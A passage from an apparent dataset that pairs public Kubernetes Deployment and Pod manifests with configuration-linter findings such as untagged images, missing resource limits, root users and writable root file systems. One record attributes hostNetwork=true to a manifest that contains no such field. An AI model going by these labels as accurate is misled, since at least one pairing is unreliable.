    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220519-c750e0df24\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "7380",
    "manifest_path": "data/manifests/the_stack_sample/sample_2702.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 0.1m\n            memory: 32M\n          limits:\n            cpu: 0.5m\n            memory: 128M\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7381",
    "manifest_path": "data/manifests/the_stack_sample/sample_2702.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 0.1m\n            memory: 32M\n          limits:\n            cpu: 0.5m\n            memory: 128M\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7382",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7383",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"recipe-be\" is using an invalid container image, \"recipe/go-recipe:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7384",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"recipe-be\" does not have a read-only root file system"
  },
  {
    "id": "7385",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"recipe-be\" is not set to runAsNonRoot"
  },
  {
    "id": "7386",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"recipe-be\" has cpu request 0"
  },
  {
    "id": "7387",
    "manifest_path": "data/manifests/the_stack_sample/sample_2703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recipe-deployment\nspec:\n  selector:\n    matchLabels:\n      app: recipe\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: recipe\n    spec:\n      containers:\n      - name: recipe-be\n        image: recipe/go-recipe:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"recipe-be\" has memory limit 0"
  },
  {
    "id": "7388",
    "manifest_path": "data/manifests/the_stack_sample/sample_2704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7389",
    "manifest_path": "data/manifests/the_stack_sample/sample_2704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "7390",
    "manifest_path": "data/manifests/the_stack_sample/sample_2704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "7391",
    "manifest_path": "data/manifests/the_stack_sample/sample_2704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "7392",
    "manifest_path": "data/manifests/the_stack_sample/sample_2704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  labels:\n    app: redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "7393",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"aaaatiwarishubaks-5216\" is using an invalid container image, \"aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7394",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7395",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aaaatiwarishubaks-5216\" does not have a read-only root file system"
  },
  {
    "id": "7396",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aaaatiwarishubaks-5216\" is not set to runAsNonRoot"
  },
  {
    "id": "7397",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"aaaatiwarishubaks-5216\" has cpu request 0"
  },
  {
    "id": "7398",
    "manifest_path": "data/manifests/the_stack_sample/sample_2705.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aaaatiwarishubaks-5216\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: aaaatiwarishubaks-5216\n  template:\n    metadata:\n      labels:\n        app: aaaatiwarishubaks-5216\n    spec:\n      containers:\n      - name: aaaatiwarishubaks-5216\n        image: aaaatiwarishubregistry.azurecr.io/aaaatiwarishubaks5216\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"aaaatiwarishubaks-5216\" has memory limit 0"
  },
  {
    "id": "7399",
    "manifest_path": "data/manifests/the_stack_sample/sample_2707.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvpod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/test-webserver\n    volumeMounts:\n    - name: test-volume\n      mountPath: /test-vmdk\n  volumes:\n  - name: test-volume\n    persistentVolumeClaim:\n      claimName: pvcsc001\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-container\" is using an invalid container image, \"gcr.io/google_containers/test-webserver\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7400",
    "manifest_path": "data/manifests/the_stack_sample/sample_2707.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvpod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/test-webserver\n    volumeMounts:\n    - name: test-volume\n      mountPath: /test-vmdk\n  volumes:\n  - name: test-volume\n    persistentVolumeClaim:\n      claimName: pvcsc001\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "7401",
    "manifest_path": "data/manifests/the_stack_sample/sample_2707.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvpod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/test-webserver\n    volumeMounts:\n    - name: test-volume\n      mountPath: /test-vmdk\n  volumes:\n  - name: test-volume\n    persistentVolumeClaim:\n      claimName: pvcsc001\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "7402",
    "manifest_path": "data/manifests/the_stack_sample/sample_2707.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvpod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/test-webserver\n    volumeMounts:\n    - name: test-volume\n      mountPath: /test-vmdk\n  volumes:\n  - name: test-volume\n    persistentVolumeClaim:\n      claimName: pvcsc001\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "7403",
    "manifest_path": "data/manifests/the_stack_sample/sample_2707.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pvpod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/test-webserver\n    volumeMounts:\n    - name: test-volume\n      mountPath: /test-vmdk\n  volumes:\n  - name: test-volume\n    persistentVolumeClaim:\n      claimName: pvcsc001\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "7404",
    "manifest_path": "data/manifests/the_stack_sample/sample_2708.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9805\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7405",
    "manifest_path": "data/manifests/the_stack_sample/sample_2708.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9805\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7406",
    "manifest_path": "data/manifests/the_stack_sample/sample_2708.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9805\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7407",
    "manifest_path": "data/manifests/the_stack_sample/sample_2708.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9805\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7408",
    "manifest_path": "data/manifests/the_stack_sample/sample_2708.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9805\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7409",
    "manifest_path": "data/manifests/the_stack_sample/sample_2710.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8624\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7410",
    "manifest_path": "data/manifests/the_stack_sample/sample_2710.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8624\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7411",
    "manifest_path": "data/manifests/the_stack_sample/sample_2710.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8624\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7412",
    "manifest_path": "data/manifests/the_stack_sample/sample_2710.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8624\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7413",
    "manifest_path": "data/manifests/the_stack_sample/sample_2710.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8624\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7414",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"master\" does not have a read-only root file system"
  },
  {
    "id": "7415",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sentinel\" does not have a read-only root file system"
  },
  {
    "id": "7416",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"master\" is not set to runAsNonRoot"
  },
  {
    "id": "7417",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sentinel\" is not set to runAsNonRoot"
  },
  {
    "id": "7418",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"master\" has cpu request 0"
  },
  {
    "id": "7419",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sentinel\" has cpu request 0"
  },
  {
    "id": "7420",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"master\" has memory limit 0"
  },
  {
    "id": "7421",
    "manifest_path": "data/manifests/the_stack_sample/sample_2712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: redis\n    redis-sentinel: 'true'\n    role: master\n  name: redis-master\nspec:\n  containers:\n  - name: master\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: MASTER\n      value: 'true'\n    ports:\n    - containerPort: 6379\n    resources:\n      limits:\n        cpu: '0.1'\n    volumeMounts:\n    - mountPath: /redis-master-data\n      name: data\n  - name: sentinel\n    image: gcr.io/kubernetes-e2e-test-images/redis:1.0\n    env:\n    - name: SENTINEL\n      value: 'true'\n    ports:\n    - containerPort: 26379\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sentinel\" has memory limit 0"
  },
  {
    "id": "7422",
    "manifest_path": "data/manifests/the_stack_sample/sample_2713.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: thl-khoaluan-qldrl\nspec:\n  selector:\n    matchLabels:\n      app: thl-khoaluan-qldrl\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: thl-khoaluan-qldrl\n    spec:\n      containers:\n      - name: thl-khoaluan-qldrl\n        image: ghcr.io/chidung091/thl-khoaluan-qldrl:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 3004\n        envFrom:\n        - secretRef:\n            name: thl-khoaluan-qldrl-secret\n            optional: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"thl-khoaluan-qldrl\" is using an invalid container image, \"ghcr.io/chidung091/thl-khoaluan-qldrl:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7423",
    "manifest_path": "data/manifests/the_stack_sample/sample_2713.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: thl-khoaluan-qldrl\nspec:\n  selector:\n    matchLabels:\n      app: thl-khoaluan-qldrl\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: thl-khoaluan-qldrl\n    spec:\n      containers:\n      - name: thl-khoaluan-qldrl\n        image: ghcr.io/chidung091/thl-khoaluan-qldrl:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 3004\n        envFrom:\n        - secretRef:\n            name: thl-khoaluan-qldrl-secret\n            optional: false\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7424",
    "manifest_path": "data/manifests/the_stack_sample/sample_2713.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: thl-khoaluan-qldrl\nspec:\n  selector:\n    matchLabels:\n      app: thl-khoaluan-qldrl\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: thl-khoaluan-qldrl\n    spec:\n      containers:\n      - name: thl-khoaluan-qldrl\n        image: ghcr.io/chidung091/thl-khoaluan-qldrl:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 3004\n        envFrom:\n        - secretRef:\n            name: thl-khoaluan-qldrl-secret\n            optional: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"thl-khoaluan-qldrl\" does not have a read-only root file system"
  },
  {
    "id": "7425",
    "manifest_path": "data/manifests/the_stack_sample/sample_2713.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: thl-khoaluan-qldrl\nspec:\n  selector:\n    matchLabels:\n      app: thl-khoaluan-qldrl\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: thl-khoaluan-qldrl\n    spec:\n      containers:\n      - name: thl-khoaluan-qldrl\n        image: ghcr.io/chidung091/thl-khoaluan-qldrl:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 3004\n        envFrom:\n        - secretRef:\n            name: thl-khoaluan-qldrl-secret\n            optional: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"thl-khoaluan-qldrl\" is not set to runAsNonRoot"
  },
  {
    "id": "7426",
    "manifest_path": "data/manifests/the_stack_sample/sample_2713.yaml",
